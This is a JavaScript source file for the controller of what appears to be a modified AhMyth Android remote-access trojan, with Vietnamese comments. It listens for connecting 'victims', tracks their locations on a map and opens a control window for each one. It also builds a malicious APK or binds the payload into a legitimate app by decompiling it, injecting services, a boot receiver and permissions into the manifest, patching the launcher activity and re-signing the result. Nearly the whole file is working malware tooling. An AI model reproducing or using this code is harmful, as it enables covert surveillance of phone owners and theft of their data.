var app = angular.module('myapp', []);
const { remote } = require('electron');
var dialog = remote.dialog;
const { ipcRenderer } = require('electron');
var exec = require('child_process').exec;
var fs = require('fs-extra')
var victimsList = remote.require('./main');
const CONSTANTS = require(__dirname + '/assets/js/Constants')
var homeDir = require('homedir');
var path = require("path");

//--------------------------------------------------------------
var viclist = {};
var dataPath = path.join(homeDir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
// APK build ra ngay trong thư mục dự án (SystemUpdate/Output) cho tiện theo dõi
var outputPath = CONSTANTS.projectOutputPath || path.join(dataPath, CONSTANTS.outputApkPath);
//--------------------------------------------------------------


// App Controller for (index.html)
app.controller("AppCtrl", ($scope) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = { enable: false, method: 'BOOT' }; //default values for binding apk

    // Clear existing victims from UI on startup to avoid "ghost" victims
    // They will reappear if they actually connect.
    for (let id in viclist) delete viclist[id];

    // Initialize default values for APK Builder
    $appCtrl.srcIP = CONSTANTS.defaultHost;
    $appCtrl.srcPort = CONSTANTS.defaultPort;
    $appCtrl.useHttps = false;

    var log = document.getElementById("log");
    $appCtrl.logs = [];
    $('.menu .item')
        .tab();
    $('.ui.dropdown')
        .dropdown();

    const window = remote.getCurrentWindow();
    $appCtrl.close = () => {
        window.close();
    };

    $appCtrl.minimize = () => {
        window.minimize();
    };

    // when user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        // notify the main proccess about the port and let him start listening
        ipcRenderer.send("SocketIO:Listen", port);
        $appCtrl.Log("Listening on port => " + port, CONSTANTS.logStatus.SUCCESS);
    }


    // fired when main peoccess (main.js) send any new notification about new victim
    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        // add the new victim to the list
        viclist[index] = victimsList.getVictim(index);
        $appCtrl.Log("New victim from " + viclist[index].ip);
        $appCtrl.$apply();
    });


    // fired if listening brings error
    ipcRenderer.on("SocketIO:Listen", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply()
    });


    // fired when main peoccess (main.js) send any new notification about disconnected victim
    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        $appCtrl.Log("Victim disconnected " + viclist[index].ip);
        // delete him from list
        delete viclist[index];
        $appCtrl.$apply();
    });

    // cập nhật vị trí victim từ xa (theo dõi định kỳ)
    ipcRenderer.on('SocketIO:VictimLocationUpdated', (event, index) => {
        if (viclist[index]) {
            viclist[index] = victimsList.getVictim(index);
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        }
    });


    // notify the main proccess (main.js) to open the lab
    $appCtrl.openLab = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    }

    // mở Lab trực tiếp tab Location để theo dõi victim trên bản đồ
    $appCtrl.openLabToLocation = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index, '#/location');
    }


    // app logs to print any new log in the black terminal
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;

        $appCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
        log.scrollTop = log.scrollHeight;
        if (!$appCtrl.$$phase)
            $appCtrl.$apply();
    }



    // function to open the dialog and choose apk to be bindded
    $appCtrl.BrowseApk = () => {
        dialog.showOpenDialog(function (fileNames) {
            // fileNames is an array that contains all the selected
            if (fileNames === undefined) {
                $appCtrl.Log("No file selected");
            } else {
                $appCtrl.Log("File choosen  " + fileNames[0]);
                readFile(fileNames[0]); // read the file
            }
        });

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }

    }





    // function to build ahmyth apk using gradle from source code
    $appCtrl.BuildAhmythApk = () => {
        $appCtrl.Log('Building APK with gradle...');
        var ahmythFolder = CONSTANTS.ahmythApkFolderPath;
        var debugApkPath = path.join(ahmythFolder, 'app/build/outputs/apk/debug/app-debug.apk');

        var buildCmd = process.platform === 'win32' ?
            '.\\gradlew.bat assembleDebug' :
            './gradlew assembleDebug';

        var buildApk = exec(buildCmd,
            { cwd: ahmythFolder, maxBuffer: 1024 * 1024 * 10, shell: true },
            (error, stdout, stderr) => {
                if (error !== null) {
                    $appCtrl.Log('APK Building Failed: ' + error.message, CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('stderr: ' + stderr, CONSTANTS.logStatus.FAIL);
                    return;
                }

                var finalApkPath = path.join(outputPath, CONSTANTS.signedApkName);
                fs.ensureDirSync(outputPath);
                $appCtrl.Log('Moving APK to output folder...');

                // Only copy once to the final destination name
                fs.copy(debugApkPath, finalApkPath, { overwrite: true }, (error) => {
                    if (error) {
                        $appCtrl.Log('Copying APK Failed: ' + error.message, CONSTANTS.logStatus.FAIL);
                        return;
                    }

                    $appCtrl.Log('APK built successfully', CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log("The APK has been built on " + finalApkPath, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.$apply();
                });
            });
    };

    // function to build the apk and sign it
    $appCtrl.GenerateApk = (apkFolder) => {

        $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
        var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
            (error, stdout, stderr) => {
                if (error !== null) {
                    $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }

                $appCtrl.Log('Signing ' + CONSTANTS.apkName + '...');
                var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" "' + path.join(outputPath, CONSTANTS.apkName) + '"',
                    (error, stdout, stderr) => {
                        if (error !== null) {
                            $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
                            return;
                        }


                        fs.unlink(path.join(outputPath, CONSTANTS.apkName), (err) => {
                            if (err) throw err;

                            $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
                            $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);

                        });
                    });
            });

    }


    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

        $appCtrl.Log("Copying Ahmyth files to orginal app...");
        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali"), (error) => {
            if (error) {
                $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.GenerateApk(apkFolder);
        })

    };


    // fuction to copy all the ahmyth permissions to the orginal app
    $appCtrl.copyPermissions = (manifest) => {
        var firstPart = manifest.substring(0, manifest.indexOf("<application"));
        var lastPart = manifest.substring(manifest.indexOf("<application"));

        var permArray = CONSTANTS.permissions;
        for (var i = 0; i < permArray.length; i++) {
            var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
            permissionName = permissionName.substring(0, permissionName.indexOf('"'));
            if (firstPart.indexOf(permissionName) == -1) {
                firstPart = firstPart + "\n" + permArray[i];
            }
        }

        return (firstPart + lastPart);

    };


    // function to use onBoot method 
    // it will bind ahmyth to orginal app 
    // and ahmyth will start once the device rebooted
    // if success then go to copy all the rest ahmyth files to orginal app
    // this method is working almost on every app 
    $appCtrl.BindOnBoot = (apkFolder) => {
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            var ahmythReciver = CONSTANTS.ahmythReciver;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + ahmythReciver + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }
                $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);

            });

        });

    };



    // function to use OnLauncher method 
    // it will bind ahmyth to orginal app 
    // and ahmyth will start once the orginal app started
    // if success then go to copy all the rest ahmyth files to orginal app
    // this method is not working on every app (unstable)
    $appCtrl.BindOnLauncher = (apkFolder) => {

        $appCtrl.Log('Finding launcher activity from AndroidManifest.xml...');
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            var lanucherPath = GetLanucherPath(data, path.join(apkFolder, "smali/"));
            if (lanucherPath == -1) {
                $appCtrl.Log("Cannot find the lanucher activity , try the other binding method.", CONSTANTS.logStatus.FAIL);
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }

                $appCtrl.Log("Fetching lanucher activity...");
                fs.readFile(lanucherPath, 'utf8', (error, data) => {
                    if (error) {
                        $appCtrl.Log('Reading launcher activity Failed ', CONSTANTS.logStatus.FAIL);
                        return;
                    }


                    var startService = CONSTANTS.serviceSrc + lanucherPath.substring(lanucherPath.indexOf("smali/") + 6, lanucherPath.indexOf(".smali")) + CONSTANTS.serviceStart;


                    var key = CONSTANTS.orgAppKey;
                    $appCtrl.Log("Modifiying lanucher activity...");
                    var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                    fs.writeFile(lanucherPath, output, 'utf8', (error) => {
                        if (error) {
                            $appCtrl.Log('Modifying lanucher activity Failed', logStatus.FAIL);
                            return;
                        }

                        $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);

                    });


                });
            });

        });

    }

    // fired when user click build button
    // collect the host, port and https setting and start building
    $appCtrl.Build = (host, port, useHttps) => {
        if (!host) {
            $appCtrl.Log('Server Host Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
            return;
        } else if (!port) {
            port = CONSTANTS.defaultPort;
        } else if (port > 65535 || port <= 1) {
            $appCtrl.Log('Choose ports from range (1,65535)', CONSTANTS.logStatus.FAIL);
            return;
        }

        var scheme = useHttps ? "https://" : "http://";

        // Update strings.xml with new server host and port
        var stringsFile = path.join(CONSTANTS.ahmythApkFolderPath, 'app/src/main/res/values/strings.xml');
        $appCtrl.Log('Updating strings.xml with new server configuration...');
        fs.readFile(stringsFile, 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading strings.xml Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.Log('Replacing server host and port...');

            // Replace server_ip
            var result = data.replace(/<string name="server_ip">.*?<\/string>/g, '<string name="server_ip">' + host + '</string>');
            // Replace server_port
            result = result.replace(/<string name="server_port">.*?<\/string>/g, '<string name="server_port">' + port + '</string>');

            fs.writeFile(stringsFile, result, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Updating strings.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }

                // check if bind apk is enabled
                if (!$appCtrl.bindApk.enable) {
                    $appCtrl.BuildAhmythApk();

                } else {
                    // generate a solid ahmyth apk
                    var filePath = $appCtrl.filePath;
                    if (filePath == null) {
                        $appCtrl.Log("Browse the apk which you want to bind", CONSTANTS.logStatus.FAIL);
                        return;
                    } else if (!filePath.includes(".apk")) {
                        $appCtrl.Log("It is not an apk file", CONSTANTS.logStatus.FAIL);
                        return;
                    }


                    var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                    $appCtrl.Log('Decompiling ' + filePath + "...");
                    var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
                        (error, stdout, stderr) => {
                            if (error !== null) {
                                $appCtrl.Log('Decompilation Failed', CONSTANTS.logStatus.FAIL);
                                return;
                            }

                            if ($appCtrl.bindApk.method == 'BOOT')
                                $appCtrl.BindOnBoot(apkFolder);

                            else if ($appCtrl.bindApk.method == 'ACTIVITY')
                                $appCtrl.BindOnLauncher(apkFolder);


                        });
                }
            });
        });
    }










});



//function to extract the luncher activity from the orginal app
function GetLanucherPath(manifest, smaliPath) {


    var regex = /<activity/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf("android.intent.category.LAUNCHER");
    var indexOfActivity = -1;

    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfActivity = indices[i];
                manifest = manifest.substring(indexOfActivity, manifest.length);
                break;
            }
        }


        if (indexOfActivity != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(1, manifest.indexOf('"'))
                manifest += '.smali';
                var files = fs.walkSync(smaliPath);
                for (var i = 0; i < files.length; i++) {
                    if (files[i].substring(files[i].lastIndexOf("/") + 1) == manifest)
                        return files[i];
                }

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = path.join(smaliPath, manifest) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



}